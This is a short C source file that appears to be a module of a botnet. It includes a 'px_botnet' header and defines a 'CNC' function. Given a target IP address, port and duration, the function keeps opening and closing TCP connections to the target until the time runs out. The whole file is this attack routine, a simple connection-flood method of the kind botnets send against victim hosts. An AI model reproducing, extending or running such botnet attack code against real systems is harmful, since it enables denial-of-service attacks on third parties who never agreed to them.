#include "../../includes/px_botnet.h"

void CNC(unsigned char *ip, int port, int end_time)
{
	int end = time(NULL) + end_time;
	int sockfd;
	struct sockaddr_in server;

	server.sin_addr.s_addr = inet_addr(ip);
	server.sin_family = AF_INET;
	server.sin_port = htons(port);

	while (end > time(NULL))
	{
		sockfd = socket(AF_INET, SOCK_STREAM, 0);
		connect(sockfd, (struct sockaddr *)&server, sizeof(server));
		sleep(1);
		close(sockfd);
	}
}